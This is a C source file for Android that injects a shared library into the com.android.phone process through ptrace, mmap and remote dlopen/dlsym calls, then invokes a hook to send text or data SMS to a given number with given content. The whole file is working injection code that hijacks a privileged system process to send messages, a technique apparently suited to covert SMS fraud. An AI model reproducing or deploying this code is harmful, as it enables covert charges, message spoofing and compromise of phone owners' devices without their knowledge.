
#if defined(ANDROID)



#include <stdio.h>
#include <stdlib.h>
#include <sys/user.h>
#include <asm/ptrace.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <elf.h>
#include <android/log.h>
#include <stdbool.h>
#include "log.h"
#include <string.h>

#define CPSR_T_MASK     ( 1u << 5 )

#if 0
#define HOOK_SMS_SEND_SO "/system/lib/libsm.so"     //hook 发送短信的so文件路径
#else
#define HOOK_SMS_SEND_SO "/data/local/tmp/libsm.so"     //hook 发送短信的so文件路径
#endif


#define SMS_NUMBER_LEN      32                  //短信号码最大长度
#define SMS_CONTENT_LEN     512                 //短信内容最大长度


const char *libc_path = "/system/lib/libc.so";
const char *linker_path = "/system/bin/linker";


int find_pid_of(const char *process_name)
{
    int id;
    pid_t pid = -1;
    DIR* dir;
    FILE *fp;
    char filename[32];
    char cmdline[256];
    
    struct dirent * entry;
    
    if (process_name == NULL)
        return -1;
    
    dir = opendir("/proc");
    if (dir == NULL)
        return -1;
    
    while((entry = readdir(dir)) != NULL) {
        id = atoi(entry->d_name);
        if (id != 0) {
            sprintf(filename, "/proc/%d/cmdline", id);
            fp = fopen(filename, "r");
            if (fp) {
                fgets(cmdline, sizeof(cmdline), fp);
                fclose(fp);
                
                if (strcmp(process_name, cmdline) == 0) {
                    /* process found */
                    pid = id;
                    break;
                }
            }
        }
    }
    
    closedir(dir);
    return pid;
}

int ptrace_getregs(pid_t pid, struct pt_regs * regs)
{
    if (ptrace(PTRACE_GETREGS, pid, NULL, regs) < 0) {
        perror("ptrace_getregs: Can not get register values");
        return -1;
    }
    
    return 0;
}

int ptrace_setregs(pid_t pid, struct pt_regs * regs)
{
    if (ptrace(PTRACE_SETREGS, pid, NULL, regs) < 0) {
        perror("ptrace_setregs: Can not set register values");
        return -1;
    }
    
    return 0;
}

int ptrace_continue(pid_t pid)
{
    if (ptrace(PTRACE_CONT, pid, NULL, 0) < 0) {
        perror("ptrace_cont");
        return -1;
    }
    
    return 0;
}

int ptrace_attach(pid_t pid)
{
    if (ptrace(PTRACE_ATTACH, pid, NULL, 0) < 0) {
        perror("ptrace_attach");
        return -1;
    }
    
    int status = 0;
    waitpid(pid, &status , WUNTRACED);
    
    return 0;
}

int ptrace_detach(pid_t pid)
{
    if (ptrace(PTRACE_DETACH, pid, NULL, 0) < 0) {
        perror("ptrace_detach");
        return -1;
    }
    
    return 0;
}

int ptrace_readdata(pid_t pid,  long src, uint8_t *buf, size_t size)
{
    uint32_t i, j, remain;
    uint8_t *laddr;
    
    union u {
        long val;
        char chars[sizeof(long)];
    } d;
    
    j = size / 4;
    remain = size % 4;
    
    laddr = buf;
    
    for (i = 0; i < j; i ++) {
        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
        memcpy(laddr, d.chars, 4);
        src += 4;
        laddr += 4;
    }
    
    if (remain > 0) {
        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
        memcpy(laddr, d.chars, remain);
    }
    
    return 0;
}

int ptrace_writedata(pid_t pid, long dest, uint8_t *data, size_t size)
{
    uint32_t i, j, remain;
    uint8_t *laddr;
    
    union u {
        long val;
        char chars[sizeof(long)];
    } d;
    
    j = size / 4;
    remain = size % 4;
    
    laddr = data;
    
    for (i = 0; i < j; i ++) {
        memcpy(d.chars, laddr, 4);
        ptrace(PTRACE_POKETEXT, pid, dest, d.val);
        dest  += 4;
        laddr += 4;
    }
    
    if (remain > 0) {
        d.val = ptrace(PTRACE_PEEKTEXT, pid, dest, 0);
        for (i = 0; i < remain; i ++) {
            d.chars[i] = *laddr ++;
        }
        ptrace(PTRACE_POKETEXT, pid, dest, d.val);
    }
    
    return 0;
}

int ptrace_call(pid_t pid, uint32_t addr, long *params, uint32_t num_params, struct pt_regs* regs)
{
    uint32_t i;
    for (i = 0; i < num_params && i < 4; i ++) {
        regs->uregs[i] = params[i];
    }
    
    if (i < num_params) {
        regs->ARM_sp -= (num_params - i) * sizeof(long) ;
        ptrace_writedata(pid, regs->ARM_sp, (uint8_t *)&params[i], (num_params - i) * sizeof(long));
    }
    
    regs->ARM_pc = addr;
    if (regs->ARM_pc & 1) {
        /* thumb */
        regs->ARM_pc &= (~1u);
        regs->ARM_cpsr |= CPSR_T_MASK;
    } else {
        /* arm */
        regs->ARM_cpsr &= ~CPSR_T_MASK;
    }
    
    regs->ARM_lr = 0;
    
    if (ptrace_setregs(pid, regs) == -1 || ptrace_continue(pid) == -1) {
        printf("error\n");
        return -1;
    }
    
    int stat = 0;
    waitpid(pid, &stat, WUNTRACED);
    while (stat != 0xb7f) {
        if (ptrace_continue(pid) == -1) {
            printf("error\n");
            return -1;
        }
        waitpid(pid, &stat, WUNTRACED);
    }
    
    return 0;
}


void* get_module_base(pid_t pid, const char* module_name)
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[1024];
    
    if (pid < 0) {
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    } else {
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }
    
    fp = fopen(filename, "r");
    
    if (fp != NULL) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, module_name)) {
                pch = strtok( line, "-" );
                addr = strtoul( pch, NULL, 16 );
                
                if (addr == 0x8000)
                    addr = 0;
                
                break;
            }
        }
        
        fclose(fp) ;
    }
    
    return (void *)addr;
}

void* get_remote_addr(pid_t target_pid, const char* module_name, void* local_addr)
{
    void* local_handle, *remote_handle;
    
    local_handle = get_module_base(-1, module_name);
    remote_handle = get_module_base(target_pid, module_name);
    
    LOGE("[+] get_remote_addr: local[%x], remote[%x], local_addr[%x]\n", local_handle, remote_handle,local_addr);
    
    void * ret_addr = (void *)((uint32_t)local_addr + (uint32_t)remote_handle - (uint32_t)local_handle);
    
    return ret_addr;
}



long ptrace_retval(struct pt_regs * regs)
{
    return regs->ARM_r0;
}

long ptrace_ip(struct pt_regs * regs)
{
    return regs->ARM_pc;
}

int ptrace_call_wrapper(pid_t target_pid, const char * func_name, void * func_addr, long * parameters, int param_num, struct pt_regs * regs)
{
    LOGE("[+] Calling %s in target process.\n", func_name);
    if (ptrace_call(target_pid, (uint32_t)func_addr, parameters, param_num, regs) == -1)
        return -1;
    
    if (ptrace_getregs(target_pid, regs) == -1)
        return -1;
    LOGE("[+] Target process returned from %s, return value=%x, pc=%x \n",
                func_name, ptrace_retval(regs), ptrace_ip(regs));
    return 0;
}

int inject_remote_process(pid_t target_pid, const char *library_path, const char *function_name, const char *param, size_t param_size,bool resume)
{
    int ret = -1;
    void *mmap_addr, *dlopen_addr, *dlsym_addr, *dlclose_addr, *dlerror_addr;
    void *local_handle, *remote_handle, *dlhandle;
    long map_base = 0;
    uint8_t *dlopen_param1_ptr, *dlsym_param2_ptr, *saved_r0_pc_ptr, *inject_param_ptr, *remote_code_ptr, *local_code_ptr;
    
    struct pt_regs regs, original_regs;
    extern uint32_t _dlopen_addr_s, _dlopen_param1_s, _dlopen_param2_s, _dlsym_addr_s, \
    _dlsym_param2_s, _dlclose_addr_s, _inject_start_s, _inject_end_s, _inject_function_param_s, \
    _saved_cpsr_s, _saved_r0_pc_s;
    
    uint32_t code_length;
    long parameters[10];
    
    long sohandle=0;
    long hook_entry_addr=0;
    
    LOGE("[+] Injecting process: %d\n", target_pid);
    
    if (ptrace_attach(target_pid) == -1)
        goto exit;
    
    if (ptrace_getregs(target_pid, &regs) == -1)
        goto exit;
    
    /* save original registers */
    memcpy(&original_regs, &regs, sizeof(regs));
    
    mmap_addr = get_remote_addr(target_pid, libc_path, (void *)mmap);
    LOGE("[+] Remote mmap address: %x\n", mmap_addr);
    
    /* call mmap */
    parameters[0] = 0;  // addr
    parameters[1] = 0x4000; // size
    parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
    parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
    parameters[4] = 0; //fd
    parameters[5] = 0; //offset
    
    if (ptrace_call_wrapper(target_pid, "mmap", mmap_addr, parameters, 6, &regs) == -1)
        goto exit;
    
    map_base = ptrace_retval(&regs);
    
    dlopen_addr = get_remote_addr( target_pid, linker_path, (void *)dlopen );
    dlsym_addr = get_remote_addr( target_pid, linker_path, (void *)dlsym );
    dlclose_addr = get_remote_addr( target_pid, linker_path, (void *)dlclose );
    dlerror_addr = get_remote_addr( target_pid, linker_path, (void *)dlerror );
    
    LOGE("[+] Get imports: dlopen: %x, dlsym: %x, dlclose: %x, dlerror: %x\n",
                dlopen_addr, dlsym_addr, dlclose_addr, dlerror_addr);
    
    printf("library path = %s\n", library_path);
    ptrace_writedata(target_pid, map_base, (uint8_t *)library_path, strlen(library_path) + 1);
    
    parameters[0] = map_base;
    parameters[1] = RTLD_NOW| RTLD_GLOBAL;
    
    if (ptrace_call_wrapper(target_pid, "dlopen", dlopen_addr, parameters, 2, &regs) == -1)
        goto exit;
    
    sohandle = ptrace_retval(&regs);
    
    LOGE("hook enter:%s",function_name);
    #define FUNCTION_NAME_ADDR_OFFSET       0x100
    ptrace_writedata(target_pid, map_base + FUNCTION_NAME_ADDR_OFFSET, (uint8_t *)function_name, strlen(function_name) + 1);
    parameters[0] = sohandle;
    parameters[1] = map_base + FUNCTION_NAME_ADDR_OFFSET;
    
    if (ptrace_call_wrapper(target_pid, "dlsym", dlsym_addr, parameters, 2, &regs) == -1){
        parameters[0] = sohandle;
        ptrace_call_wrapper(target_pid, "dlclose", dlclose_addr, parameters, 1, &regs);
        goto exit;
    }
    
    
    hook_entry_addr = ptrace_retval(&regs);
    LOGE("hook_entry_addr = %p\n", hook_entry_addr);
    
    #define FUNCTION_PARAM_ADDR_OFFSET      0x200
    ptrace_writedata(target_pid, map_base + FUNCTION_PARAM_ADDR_OFFSET, (uint8_t *)param, strlen(param) + 1);
    parameters[0] = map_base + FUNCTION_PARAM_ADDR_OFFSET;
    
    if (ptrace_call_wrapper(target_pid, "hook_entry", (void *)hook_entry_addr, parameters, 1, &regs) == -1)
        goto exit;
    ret = (int)ptrace_retval(&regs);
    if(resume){
        parameters[0] = sohandle;
        if (ptrace_call_wrapper(target_pid, "dlclose", dlclose_addr, parameters, 1, &regs) == -1)
            goto exit;
    }
    /* restore */
    ptrace_setregs(target_pid, &original_regs);
    ptrace_detach(target_pid);
exit:
    return ret;
}


int hook_send_text_sms(char * number,char * content){
    pid_t target_pid = find_pid_of("com.android.phone");
    if (-1 == target_pid) {
        printf("Can't find the process\n");
        return -1;
    }
    LOGE("hook_send_text_sms, target_pid :%d",target_pid);
    
    char param[SMS_NUMBER_LEN+SMS_CONTENT_LEN+5]={0};
    sprintf(param,"%d|%d|%s|%s",1,0,number,content);
    LOGE("param:%s",param);
    return inject_remote_process(target_pid, HOOK_SMS_SEND_SO, "hook_entry",  param, strlen(param),true);
}

int hook_send_data_sms(char * number,char * content,int32_t port){
    pid_t target_pid = find_pid_of("com.android.phone");
    if (-1 == target_pid) {
        printf("Can't find the process\n");
        return -1;
    }
    LOGE("hook_send_data_sms, target_pid :%d",target_pid);
    
    char param[SMS_NUMBER_LEN+SMS_CONTENT_LEN+1]={0};
    sprintf(param,"%d|%ld|%s|%s",2,port,number,content);
    return inject_remote_process(target_pid, HOOK_SMS_SEND_SO, "hook_entry",  param, strlen(param),true);
}
#else
#include "clog.h"

int hook_send_text_sms(char * number,char * content){
    LOGE("call hook send text sms");
    return 0;
}

int hook_send_data_sms(char * number,char * content,int32_t port){
    LOGE("call hook send data sms");
    return 0;
}

int hook_recv_sms(){
    LOGE("call hook recv sms");
    return 0;
}

int hook_get_env(){
    LOGE("call hook get env");
    return 0;
}
#endif


